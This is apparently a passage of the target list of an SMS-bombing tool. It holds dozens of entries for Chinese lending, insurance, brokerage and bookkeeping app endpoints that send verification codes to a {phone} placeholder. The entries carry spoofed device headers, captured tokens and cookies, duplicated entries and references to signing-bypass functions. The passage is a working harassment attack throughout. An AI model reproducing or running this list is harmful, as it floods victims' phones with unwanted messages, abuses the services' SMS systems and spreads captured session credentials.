      "die": "qpLcS1l7/K6wGPPGilp3uH/9OKCUmy0VGJhL1zp642LbbgFXdtqbcUIszQmvtl9wcbbgBRjsnjp0+R0/kMNXF6q1WdHZTNW4LLBDD3tMNa7hItRmbPtQ0DPiOtFYbhw46SNP1Jw3iBo8shlWJBVCD8hT4bXlF2u0SzrzDcupQcwVHJ0XD2p6TWBcHIf3tr9+azTr48drs0woA4Tt/KjDj90gfroTpe7yrbDsbZ1KGH9SGa2zDK+/f8rOqzqz5eU+yKN9bw6InqHSSyKYoYT4FQfh80Dr4bfD2mHjxqYQ4MlAuE9UH7BsQB6XBDONL6wJJW4SkKe96609f2kLtzc08cxdxgjQhdFcavLNbiJ5q2QE704SlidqX+IvhsxdDNypBUz8cGYaaQfKwhRG85oX05v1A342Do0FRXNq7LJ28mpPgtpbwml+shiMGv/Eqh8iLedKRi517wN8vRmvD2K9Z4KRlICE0ulblN/hlwxoxyudTvVm96qnKGRQUVXNQpBTYQnZi9jf8iHtNCYIZKJ8ugV1A/9UUPmgI8pHdzEnHC7rZGuvmULEIgrAwUKfLSD6r6LobMbWCMxFsSqYqFezck+L5b375Z2wJ9GtrwEocIlHh5pKozvo3WY+6WaJOQi4xROivHnnzUzBn8jC2Mrz/lrqSrD4YmYzmLeW4HzSda5djFMSExnCdxkZtpZtk0MoF9bMuYtrskJ7Laou6H0H6hH3f3BQ1Vf3jGtdizHy21Y3RsXEcUAjqTKrwSDU2+XJuqo6ppHKRfjUtHPIqZDp9jt2DkTEqDEk/5ffPfJGDFKQkjxVjl+fCrcwGuhf3kA8Sdo9YPC4rxOS5oRalhVYjKcc/zDciiUILq/U2ToWRcVFwFv06558ZFvRPLayA9mKEIm/IIaZ3C8PuD+2V5vnP4zNfx/bcoQiSEbr6Ek/d+pn7VerQDXdl4G65BND37Tlql+r8usopCCGyRUZz/gfpQ/6lV6/T/xztuN9Szh0l6GyvZwXdHGAHTEjMBR3CMY5suolb5aEW83FL4hKX6EZ899OYIhuO9+L/3R6xl9W5Rk="
    }
  },
{
  "name": "aqapi.szaqkj.cn",
  "url": f"https://aqapi.szaqkj.cn/app/sendCode/action?account={phone}&user_name=f406aecc730c83552fcc3df251e2378d&pkg_name=aqkj.ohuhl.hjlhxg&version_code=6&markets=4&source=1",
  "method": "GET",
  "headers": {
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip"
  }
},
{
  "name": "aqapi.szaqkj.cn",
  "url": f"https://aqapi.szaqkj.cn/app/sendCode/action?account={phone}&user_name=f406aecc730c83552fcc3df251e2378d&pkg_name=aqkj.ohuhl.hjlhxg&version_code=6&markets=4&source=1",
  "method": "GET",
  "headers": {
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip"
  }
},
{
  "name": "aqapi.szaqkj.cn",
  "url": f"https://aqapi.szaqkj.cn/app/sendCode/action?account={phone}&user_name=f406aecc730c83552fcc3df251e2378d&pkg_name=aqkj.ohuhl.hjlhxg&version_code=6&markets=4&source=1",
  "method": "GET",
  "headers": {
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip"
  }
},
{
  "name": "aqapi.szaqkj.cn",
  "url": f"https://aqapi.szaqkj.cn/app/sendCode/action?account={phone}&user_name=f406aecc730c83552fcc3df251e2378d&pkg_name=aqkj.ohuhl.hjlhxg&version_code=6&markets=4&source=1",
  "method": "GET",
  "headers": {
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip"
  }
},
{
  "name": "guagua.beijingmorning.cn",
  "url": "http://guagua.beijingmorning.cn/index/sendcode",
  "method": "POST",
  "json_data": {
    "phone": f"{phone}"
  },
  "headers": {
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json",
    "languages": "zh-Hans",
    "qudao": "OnePlus",
    "platform": "android",
    "idfa": "0ABA05F9CFE542D59C4178618A3ED1041c0bb8f429c12d6a975984e37cb0ff45",
    "token": "",
    "flavor": "oppo",
    "uid": "",
    "version": "2.7.4",
    "bundleid": "com.guaguabill.android",
    "fcuuid": "0ABA05F9CFE542D59C4178618A3ED1041c0bb8f429c12d6a975984e37cb0ff45",
    "phonemodel": "OPD2404"
  }
},
{
  "name": "api.ledger.wzdxy.com",
  "url": "https://api.ledger.wzdxy.com/auth/send-phone-code",
  "method": "POST",
  "json_data": {
    "phone": "+86{f'{phone}'}"
  },
  "headers": {
    "Connection": "Keep-Alive",
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json",
    "app-version": "1.6.0",
    "app-build-number": "275",
    "user-device-system": "Android",
    "user-device-model": "OPD2404",
    "user-device-brand": "OnePlus",
    "user-device-unique-id": "9ae620724b9a4835",
    "user-device-name": "OnePlus Pad Pro",
    "user-device-system-version": "15",
    "user-device-type": "Tablet",
    "user-platform": "android"
  }
},
{
  "name": "mdd.miidoodoo.com",
  "url": "https://mdd.miidoodoo.com/codeRegister",
  "method": "GET",
  "params": {
    "phonenumber": f"{phone}"
  },
  "headers": {
    "Accept-Encoding": "gzip",
    "version": "1.6.2",
    "authorization": "",
    "content-type": "application/json"
  }
},
{
  "name": "ddg.zmddg.com",
  "url": "https://ddg.zmddg.com/ddg/api/app/sendSMS",
  "method": "GET",
  "params": {
    "phone": f"{phone}"
  },
  "headers": {
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "X-Access-Token": "",
    "Content-Type": "application/json"
  }
},
{
  "name": "beiyidata.cn",
  "url": "https://beiyidata.cn/api/users/send-sms-code",
  "method": "POST",
  "json_data": {
    "phoneNumber": f"{phone}"
  },
  "headers": {
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Content-Type": "application/json",
    "sec-ch-ua-platform": "\"Android\"",
    "sec-ch-ua": "\"Chromium\";v=\"130\", \"Android WebView\";v=\"130\", \"Not?A_Brand\";v=\"99\"",
    "sec-ch-ua-mobile": "?0",
    "X-Requested-With": "com.beiyi.bookkeeping",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
  }
},
{
  "name": "www.youwojizhang.cn",
  "url": "https://www.youwojizhang.cn/api/code/getSmsCode",
  "method": "POST",
  "json_data": {
    "mobile": f"{phone}",
    "type": "register",
    "device": "OnePlus&OPD2404",
    "token": ""
  },
  "headers": {
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json"
  }
},
{
  "name": "aqapi.szaqkj.cn",
  "url": "https://aqapi.szaqkj.cn/app/sendCode/action",
  "method": "GET",
  "params": {
    "account": f"{phone}",
    "user_name": "37aa85247f4d0804f492c5e81523682a",
    "pkg_name": "gyrj.pimrg.dpepb",
    "version_code": "3",
    "markets": "4",
    "source": "1"
  },
  "headers": {
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip"
  }
},
{
  "name": "47.104.212.213:47080",
  "url": "http://47.104.212.213:47080/app-api/system/login/send-sms-code",
  "method": "POST",
  "json_data": {
    "mobile": f"{phone}",
    "scene": 1
  },
  "headers": {
    "Host": "47.104.212.213:47080",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json"
  }
},
{
  "name": "guaizhu.congbaoba.cn",
  "url": "https://guaizhu.congbaoba.cn/prod-api/api/auth/getPhoneAuthCode",
  "method": "GET",
  "params": {
    "phone": f"{phone}"
  },
  "headers": {
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "imei": "0ABA05F9CFE542D59C4178618A3ED1041c0bb8f429c12d6a975984e37cb0ff45",
    "device": "Android",
    "terminal": "vivo",
    "version": "2.2.0",
    "appPackage": "com.congbaokeji.guaizhujizhang"
  }
},
{
  "name": "autodz.sjsdz.cn",
  "url": "https://autodz.sjsdz.cn/api/fintax/application/auto/common/sms/getSmsCode/{f'{phone}'}",
  "method": "GET",
  "headers": {
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "access_token": "",
    "refresh_token": "",
    "USEAPP": "sjs",
    "isc-api-version": "",
    "Cookie": "access_token=; refresh_token="
  }
},
{
  "name": "hnyztapi.epscc.top",
  "url": "https://hnyztapi.epscc.top/api/sms/send",
  "method": "POST",
  "json_data": {
    "mobile": f"{phone}",
    "event": "mobilelogin"
  },
  "headers": {
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "appname": "yjz",
    "version": "1.0.6",
    "platform": "App",
    "Content-Type": "application/json;charset:utf-8",
    "token": "",
    "Cookie": "SITE_TOTAL_ID=6448b37b4ccd5d5c0a2fd652b1eb0b3d"
  }
},
{
  "name": "hnyztapi.epscc.top",
  "url": "https://hnyztapi.epscc.top/api/sms/send",
  "method": "POST",
  "json_data": {
    "mobile": f"{phone}",
    "event": "mobilelogin"
  },
  "headers": {
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "api-version": "163",
    "version": "1.6.3",
    "platform": "App",
    "Content-Type": "application/json;charset:utf-8",
    "token": "",
    "Cookie": "SITE_TOTAL_ID=668ed0df353e7a90805f7c0288755a65"
  }
},
{
  "name": "www.moranworld.cn",
  "url": "https://www.moranworld.cn/app/bakeke/user",
  "method": "POST",
  "json_data": {
    "sign": "00000000000000000000000000000000",
    "sid": "0000000000000000",
    "method": "signupvcode",
    "data": {
      "tel": f"{phone}"
    }
  },
  "headers": {
    "Accept": "application/json",
    "Content-Type": "application/json",
    "Accept-Charset": "UTF-8"
  }
},
{
  "name": "a.xrwangluo.com",
  "url": "https://a.xrwangluo.com/code/code",
  "method": "POST",
  "data": {
    "number": f"{phone}",
    "case": "login"
  },
  "headers": {
    "Accept-Encoding": "gzip",
    "c-token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ2aXNpdHMiOjIsImR1aWQiOiJhUG5VdEFrUWFZMERBQm1yazNZZUUwdDEiLCJkaWQiOjUxNjk5ODU3LCJhcHBpZCI6NTIwODU3NTEsImJyYW5jaCI6ImNvbS5saWdodHBhbG0uZmVucWlhIiwidmVyc2lvbiI6IjcuOS42IiwiY2hhbm5lbCI6IjIwMDAwIiwicGlkIjoiZmVucWkiLCJwZCI6ImZlbnFpIiwiZ3JvdXAiOiJkZWZhdWx0IiwidGFncyI6W10sImxhc3QiOjYzMiwiaW5pdCI6MTc2MTIwMzM4MCwib3MiOiJhbmRyb2lkIiwicXVlcnlfb3MiOiJhbmRyb2lkIiwiYXBwX29zIjoiYW5kcm9pZCIsImFwcF92ZXJzaW9uIjoiNy45LjYiLCJxdWVyeV92ZXJzaW9uIjoiOC43LjUiLCJhcHBfaW5uZXJfdmVyc2lvbiI6IjEuMC4yIiwieHJfc2lkIjoiU1dwWk5GcHFiR3RPUjBrd1RsUlNhMDFxV1RCUFZHUm9XVlJyZDFsNlpHdGFRMGs2TVhaQ2NGTTRPbTUzYUVFMmFWbGtSbk5hWm5wd1FXUldNV0pZVVMxVloyMUJVUSJ9.wANdhdxn9ZFNPuVV1aNuvcOwCygvs0C7XBl898b_xIA",
    "Cookie": "ctoken=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ2aXNpdHMiOjIsImR1aWQiOiJhUG5VdEFrUWFZMERBQm1yazNZZUUwdDEiLCJkaWQiOjUxNjk5ODU3LCJhcHBpZCI6NTIwODU3NTEsImJyYW5jaCI6ImNvbS5saWdodHBhbG0uZmVucWlhIiwidmVyc2lvbiI6IjcuOS42IiwiY2hhbm5lbCI6IjIwMDAwIiwicGlkIjoiZmVucWkiLCJwZCI6ImZlbnFpIiwiZ3JvdXAiOiJkZWZhdWx0IiwidGFncyI6W10sImxhc3QiOjYzMiwiaW5pdCI6MTc2MTIwMzM4MCwib3MiOiJhbmRyb2lkIiwicXVlcnlfb3MiOiJhbmRyb2lkIiwiYXBwX29zIjoiYW5kcm9pZCIsImFwcF92ZXJzaW9uIjoiNy45LjYiLCJxdWVyeV92ZXJzaW9uIjoiOC43LjUiLCJhcHBfaW5uZXJfdmVyc2lvbiI6IjEuMC4yIiwieHJfc2lkIjoiU1dwWk5GcHFiR3RPUjBrd1RsUlNhMDFxV1RCUFZHUm9XVlJyZDFsNlpHdGFRMGs2TVhaQ2NGTTRPbTUzYUVFMmFWbGtSbk5hWm5wd1FXUldNV0pZVVMxVloyMUJVUSJ9.wANdhdxn9ZFNPuVV1aNuvcOwCygvs0C7XBl898b_xIA; Path=/"
  }
},
{
  "name": "api-shanqian.gengguangcj.cn",
  "url": "https://api-shanqian.gengguangcj.cn/v1/user/sendLoginSms",
  "method": "POST",
  "data": {
    "mobile": f"{phone}",
    "_token": "",
    "_os": "2",
    "_phone": "",
    "_os_version": "15",
    "_version": "4.0.2",
    "_package": "com.jyj.oa",
    "_did": "0925a0fad21e2a9a",
    "_oa_id": "0ABA05F9CFE542D59C4178618A3ED1041c0bb8f429c12d6a975984e37cb0ff45",
    "_channel": "android-jyj1-oppo",
    "_time": "1761203965",
    "_lang": "zh-CN",
    "_dm": "OPD2404",
    "_dbr": "OnePlus",
    "_sys_ver": "15",
    "_ua": "0000",
    "_request_id": "1761203965_",
    "_user_id": "",
    "_subject": "3",
    "_st": "1",
    "appname": "急用借",
    "company": "沧源佤族自治县恒万霖小额贷款有限公司"
  },
  "headers": {
    "Accept-Encoding": "gzip"
  }
},
{
  "name": "yzx.guoguoenglish.com",
  "url": "https://yzx.guoguoenglish.com/api/yzx/captcha/getCaptcha",
  "method": "POST",
  "json_data": {
    "pkg": "com.cqfl.zsclyq",
    "phone": f"{phone}",
    "type": "1",
    "token": "",
    "app_bundle_label": "zsclyq_oppo",
    "channel": "oppo"
  },
  "headers": {
    "Accept": "application/x-www-form-urlencoded",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json",
    "appversion": "1.2.9"
  }
},
{
  "name": "pawn-api.duoduohudong.com.cn",
  "url": "https://pawn-api.duoduohudong.com.cn/txyuser/txy/login/send",
  "method": "POST",
  "json_data": {
    "userPhone": f"{phone}",
    "timestamp": 1761226130000
  },
  "headers": {
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json",
    "channel-token": "PFgCuoacqnND1761226127085",
    "current-version": "2.0.9",
    "channel-code": "611a56c0c0fb4e457e24593140445723847d099f6c244881",
    "origin-channel": "oppo",
    "version-code": "209",
    "app-platform": "android",
    "tenant-id": "1",
    "app-name": "hyhua"
  }
},
{
  "name": "hf.taoyirong.cn",
  "url": "https://hf.taoyirong.cn/api/user/api/verify/request/sms/cfq",
  "method": "POST",
  "json_data": {
    "phone": f"{phone}"
  },
  "headers": {
    "Connection": "Keep-Alive",
    "Accept": "application/json",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json",
    "TENANT-ID": "1",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "X-Client-Token": "",
    "Cookie": "acw_tc=0bca323a17612262863235282eab89432f51bb9364adcab7d037689ab1b116"
  }
},
{
  "name": "pawn-api.duoduohudong.com.cn",
  "url": "https://pawn-api.duoduohudong.com.cn/txyuser/txy/login/send",
  "method": "POST",
  "json_data": {
    "userPhone": f"{phone}",
    "timestamp": 1761228076000
  },
  "headers": {
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json",
    "channel-token": "xwMZWMuDRLQN1761228070116",
    "current-version": "2.1.2",
    "channel-code": "99f9099ebe2ca8d430919ea87c53ff45522ce715694d1d55",
    "origin-channel": "oppo",
    "version-code": "212",
    "app-platform": "android",
    "tenant-id": "1",
    "app-name": "yingxiaohua"
  }
},
{
  "name": "hyqb.jinnuodai.com.cn",
  "url": "https://hyqb.jinnuodai.com.cn/api/v2/sms/send",
  "method": "POST",
  "params": {
    "phone": f"{phone}"
  },
  "headers": {
    "Connection": "Keep-Alive",
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip",
    "Authorization": "",
    "distributorId": "289",
    "tag": "sbqb-speed",
    "Content-Type": "application/json;charset=utf-8;",
    "Content-Length": "0"
  }
},
{
  "name": "yxh.fengzhui.cn",
  "url": "https://yxh.fengzhui.cn/h5judgment/form/get-code",
  "method": "POST",
  "json_data": {
    "phone": f"{phone}",
    "channelSign": "zRqOLB"
  },
  "headers": {
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json; charset=utf-8",
    "channel_sign": "",
    "phone_type": "2",
    "Authorization": ""
  }
},
{
  "name": "www.weirongtong.cn",
  "url": "https://www.weirongtong.cn/appApi/appLoginApi/sendPhoneCode",
  "method": "POST",
  "json_data": {
    "mobilePhone": f"{phone}",
    "channel": "channel-wrt-oppo",
    "position": "1"
  },
  "headers": {
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json"
  }
},
{
  "name": "api.mlscfkj.com",
  "url": "https://api.mlscfkj.com/v1/user/sendLoginSms",
  "method": "POST",
  "data": {
    "mobile": f"{phone}",
    "_token": "",
    "_os": "2",
    "_phone": "",
    "_os_version": "15",
    "_version": "1.0.0",
    "_package": "com.fxd.szslf",
    "_did": "UKQ1.231108.001",
    "_oa_id": "0ABA05F9CFE542D59C4178618A3ED1041c0bb8f429c12d6a975984e37cb0ff45",
    "_channel": "android-fxd-oppo",
    "_time": "1761229081",
    "_lang": "zh-CN",
    "_dm": "OPD2404",
    "_dbr": "OnePlus",
    "_sys_ver": "15",
    "_ua": "0000",
    "_request_id": "1761229081_",
    "_user_id": "",
    "_subject": "3",
    "_st": "1",
    "appname": "放心贷",
    "company": "深圳市盛联丰小额贷款有限公司"
  },
  "headers": {
    "Accept-Encoding": "gzip"
  }
},
{
  "name": "zgrb.epicc.com.cn",
  "url": "https://zgrb.epicc.com.cn/G-BASE/a/common/shortMessageCode/getMessageCode/v1",
  "method": "POST",
  "json_data": {
    "body": {
      "functionType": "1",
      "mobilePhone": f"{phone}"
    },
    "head": {
      "accessToken": "",
      "adCode": "469023",
      "appInfo": {
        "appBuild": "318",
        "appVersion": "6.27.1"
      },
      "deviceInfo": {
        "deviceId": "9c0dcca9-b0f9-31d3-9062-a68df844f9e9",
        "deviceModel": "OPD2404",
        "osType": "android",
        "osVersion": "15",
        "romType": "7",
        "romVersion": ""
      },
      "tags": {
        "tags": [],
        "tagsLogin": []
      },
      "token": "",
      "userId": ""
    },
    "uuid": "4c432dbf-ed1a-44d9-a633-3df62a5f6bd1"
  },
  "headers": {
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json; charset=UTF-8",
    "Authorization": "",
    "X-Tingyun-Id": "4Nl_NnGbjwY;c=2;r=631081252;",
    "X-Tingyun": "c=A|y2O1p_rVL8k;",
    "Cookie": "epicc_ntid=AAAAAWj6OrJ8u0Os5dz7Ag=="
  }
},
{
  "name": "app.foundersc.com",
  "url": "https://app.foundersc.com/kh/api/login/v2/captcha",
  "method": "POST",
  "data": {
    "mobile": f"{phone}"
  },
  "headers": {
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "app": "android/8.44.0",
    "optionToken": "",
    "activeAssetProp": "",
    "DeviceID": "6a952c2fe9b246d8b8b6cbc8b4f80185",
    "crmAuth": "",
    "marginToken": "",
    "internalSource": "1001",
    "Op-Station": "new_op:RAvm4UdUt9+w6blg2wJIY7jc5lYW+0JXo+lkJVVB0Ncz5C7s7RdZk8gkBRdfLa68mxosAdWukT+N/LRv8TQpqZ3tVk5B2AphqaLR4H+D74pjoSndjqnfIrCN7DjT+E3TFqlr0njOYbwggjPfwXroow==",
    "device": "MODEL:OnePlus OPD2404;VERSION:Android15;OTHER:OPD2404_15.0.0.601(CN01) 35;",
    "branchNo": "",
    "token": ""
  }
},
{
  "name": "emapp.emoney.cn",
  "url": "https://emapp.emoney.cn/user/auth/getloginsmscode",
  "method": "POST",
  "json_data": {
    "accId": f"{phone}",
    "accType": 2
  },
  "headers": {
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json",
    "x-protocol-id": "user%2Fauth%2Fgetloginsmscode",
    "x-request-id": "null",
    "em-sign": "23082404151001:a8c090ec0fa3d5ba67641fb11e2fe44c:APD233DK5f:1761231669622",
    "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImN0eSI6IkpXVCJ9.eyJ1dWQiOjEwMTU0MTY1NjAsInVpZCI6MjkzODc5NjIsImRpZCI6IjZhOTUyYzJmZTliMjQ2ZDhiOGI2Y2JjOGI0ZjgwMTg1IiwidHlwIjo0LCJhY2MiOiI2YTk1MmMyZmU5YjI0NmQ4YjhiNmNiYzhiNGY4MDE4NSIsInN3dCI6MSwibGd0IjoxNzYxMjMxNjUwNzA2LCJuYmYiOjE3NjEyMzE2NTAsImV4cCI6MTc2MjQ0MTI1MCwiaWF0IjoxNzYxMjMxNjUwfQ.EJievLjJpcODR8uzjPiOu1zZjY4iDMv6P0U-K9l1eTY",
    "x-android-agent": "EMAPP/6.1.1(Android;35)",
    "emapp-viewmode": "1",
    "em-resp-fold": "1"
  }
},
{
  "name": "wechat.chinalife-p.com.cn",
  "url": "https://wechat.chinalife-p.com.cn/cdf/wechat/user/appAuth/getVerifyCode",
  "method": "POST",
  "json_data": {
    "mobilePhone": f"{phone}",
    "captchaType": "01"
  },
  "headers": {
    "Connection": "close",
    "Accept-Encoding": "gzip",
    "operateId": "",
    "terminal": "APP",
    "version": "5.2.6",
    "appOS": "A",
    "cdf-token-default": ""
  }
},
{
  "name": "user.wacai365.com",
  "url": "https://user.wacai365.com/login_api/sms/send",
  "method": "POST",
  "json_data": {
    "mob": f"{phone}",
    "verCodeType": "SMS"
  },
  "headers": {
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json; charset=utf-8",
    "X-DeviceType": "OnePlus OPD2404",
    "X-Mc": "21000086",
    "X-Md": "14779df13ef6428e828c0db2be1b011f",
    "X-OSVer": "Android 15",
    "X-Platform": "41",
    "X-Deviceid": "14779df13ef6428e828c0db2be1b011f",
    "X-UUID": "6cdfa5368c38413994950430e815fbed",
    "X-Access-Token": "",
    "X-Appver": "5.7.8",
    "X-Trace-Id": "7bec9130cd02494f97a0e2e21397c413",
    "Cookie": "session_id=2b3304b8a9da491381833c3ea85a205d"
  }
},
{
  "name": "m.touker.com",
  "url": "https://m.touker.com/account/stock/guide/index/sendSmsCode.do",
  "method": "POST",
  "data": {
    "phone": f"{phone}",
    "deviceUUID": "v1__PImPF1SOA0x3wvaJrHJZEA"
  },
  "headers": {
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "sec-ch-ua-platform": "\"Android\"",
    "X-Requested-With": "XMLHttpRequest",
    "sec-ch-ua": "\"Chromium\";v=\"130\", \"Android WebView\";v=\"130\", \"Not?A_Brand\";v=\"99\"",
    "sec-ch-ua-mobile": "?0",
    "Origin": "https://m.touker.com",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://m.touker.com/account/stock/guide/index.htm?referrer=https://m.touker.com/hbzqkhview/index.html",
    "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
    "Cookie": "acw_tc=0a5cc91617613252880581805efe76563a0f06a09fff5298a7eb35877d4ac3; _b_=e768bf6f-a4fc-4de5-941d-e500a59d48128E01CE61; deviceInfo=%7B%22macAddress%22%3A%22%22%2C%22systemName%22%3A%22Android%22%2C%22model%22%3A%22%22%2C%22appVerion%22%3A%2215%22%2C%22localizedModel%22%3A%22%22%2C%22uuid%22%3A%22%22%2C%22systemVersion%22%3A%2215%22%2C%22phoneNum%22%3A%22%22%2C%22ipAdress%22%3A%22%22%2C%22idfa%22%3A%22%22%2C%22imsi%22%3A%22%22%2C%22iccid%22%3A%22%22%2C%22rmpn%22%3A%22%22%2C%22dev%22%3A%22HB-H5%22%7D; sajssdk_2015_cross_new_user=1; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219a172b0d29829-048cad55e52bc14-1713104a-923544-19a172b0d2b67b%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTlhMTcyYjBkMjk4MjktMDQ4Y2FkNTVlNTJiYzE0LTE3MTMxMDRhLTkyMzU0NC0xOWExNzJiMGQyYjY3YiJ9%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219a172b0d29829-048cad55e52bc14-1713104a-923544-19a172b0d2b67b%22%7D; partnerCode="
  }
},
{
    'name': "HRHGSTOCK-AES",
    'func': send_hrhgstock,
    'args': [phone]
},
{
    'name': "CHINAHGC-AES-CBC",
    'func': send_chinahgc,
    'args': [phone]
},
{
  "name": "zzkh.gf.com.cn",
  "url": "https://zzkh.gf.com.cn/token/mobile/sendSmsCode",
  "method": "POST",
  "params": {
    "mobile": f"{phone}"
  },
  "data": {
    "mobile": f"{phone}",
    "type": "sms",
    "version": "3.10.27",
    "platform": "RN",
    "skipOpenCheck": "1"
  },
  "headers": {
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "token": "",
    "x-token": "lomCKh0yPvE5HdmxkMelHlst2L5bjCN1ilrr0rf+3H8=",
    "version": "Premium mdoppo 3.10.27",
    "x-trace-id": "6dd855ce-f73a-4ed2-c439-a526af2e337f",
    "x-step": "login",
    "x-channel": "mdoppo"
  }
},
{
  "name": "igcl.generalichina.com",
  "url": "https://igcl.generalichina.com/api/appuser/send/v1/send-pin",
  "method": "POST",
  "json_data": {
    "mobileNo": f"{phone}",
    "smspin": "",
    "pinType": "modifyPwd"
  },
  "headers": {
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json; charset=utf-8",
    "deviceversion": "android 15",
    "deviceid": "49ab6ae4fc6ec462",
    "version": "13.0.9",
    "devicename": "OPD2404/OnePlus",
    "device": "APP",
    "appname": "com.generalichina.ePolicy",
    "Cookie": "BIGipServerpool_igcl=!fjHeSUUGTlIUm4yjx4+w8EJFfKJLKYYp/y7Y708nwxrrcn8Ha5JaMZIwRsvKNe+W4bZkQ2dJOaiiEYk="
  }
},
{
  "name": "kapi-websi.licaimofang.cn",
  "url": "https://kapi-websi.licaimofang.cn//passport/send_verify_code/20210101?app=4000&ts=1761508649974&did=430690f99666c0e9&chn=OPPO&ver=7.9.4&platform=android&device=OnePlus%20Pad%20Pro&deviceId=pineapple&brandName=OnePlus&systemVersion=15&request_id=17615086499741414969&oaid=0ABA05F9CFE542D59C4178618A3ED1041c0bb8f429c12d6a975984e37cb0ff45&currentViewPage=Login",
  "method": "POST",
  "json_data": {
    "mobile": f"{phone}",
    "operation": "passport_login"
  },
  "headers": {
    "Connection": "Keep-Alive",
    "Accept": "application/x-www-form-urlencoded; charset=utf-8",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json; charset=utf-8",
    "Cookie": "acw_tc=0a45662e17615086740757597e6c9539b077c58c3fccd74aebff4bffb562e6"
  }
},
{
    'name': "EASTMONEY-DES-MD5",
    'func': des_cbc_md5_encrypt,
    'args': [phone]
},
{
  "name": "app-api.yangjibao.com",
  "url": "https://app-api.yangjibao.com/send_code",
  "method": "POST",
  "json_data": {
    "phone": f"{phone}"
  },
  "headers": {
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json",
    "version": "2.0.20",
    "request-sign": "a050d54520fa2d6010d56d6b62b88461",
    "authorization": "android:",
    "request-time": "1761509795",
    "platform": "oppoyysc"
  }
},
{
  "name": "120.76.229.148:1080",
  "url": "http://120.76.229.148:1080/investment-adviser/customer/send_sms",
  "method": "POST",
  "json_data": {
    "mobile": f"{phone}",
    "type": "login"
  },
  "headers": {
    "Host": "120.76.229.148:1080",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json; charset=utf-8",
    "sessionCode": "",
    "channelType": "android",
    "systemType": "OnePlus OPD2404 Android 15",
    "versionNumber": "1.20.17.oppo",
    "orgCode": "0007"
  }
},
{
  "name": "api.zhongyingtougu.com",
  "url": "https://api.zhongyingtougu.com/api/v2/uc/sms/signin",
  "method": "POST",
  "json_data": {
    "mobile": f"{phone}",
    "opCode": "signin",
    "regCode": "",
    "addWay": 3,
    "appName": "zytg",
    "bizName": "zytg",
    "device": {
      "typeId": "3",
      "token": "04fc5452a7a708182f6417aed577bb1d19f6",
      "tokenType": "2",
      "clientUuid": "ce2d9c4b5253585103d4cd80312f577b"
    },
    "referer": "",
    "sessionId": "",
    "token": ""
  },
  "headers": {
    "Accept": "application/json",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json; charset=utf-8",
    "x-sessionid": "",
    "appname": "zytg",
    "bizname": "zytg",
    "Cookie": "X-SessionId=6b2d2daf78a6405da863d0647ded9418"
  }
},
{
    'name': "LANYI-TOKEN-SMS",
    'func': lanyi_send_sms,
    'args': [phone]
},
{
    'name': "TALICAI-MD5-SMS",
    'func': talicai_send_sms,
    'args': [phone]
},
{
    'name': "TALICAI-MD5-SMS",
    'func': talicai_send_sms,
    'args': [phone]
},
{
    'name': "TALICAI-MD5-SMS",
    'func': talicai_send_sms,
    'args': [phone]
},
{
    'name': "TALICAI-MD5-SMS",
    'func': talicai_send_sms,
    'args': [phone]
},
{
    'name': "TALICAI-MD5-SMS",
    'func': talicai_send_sms,
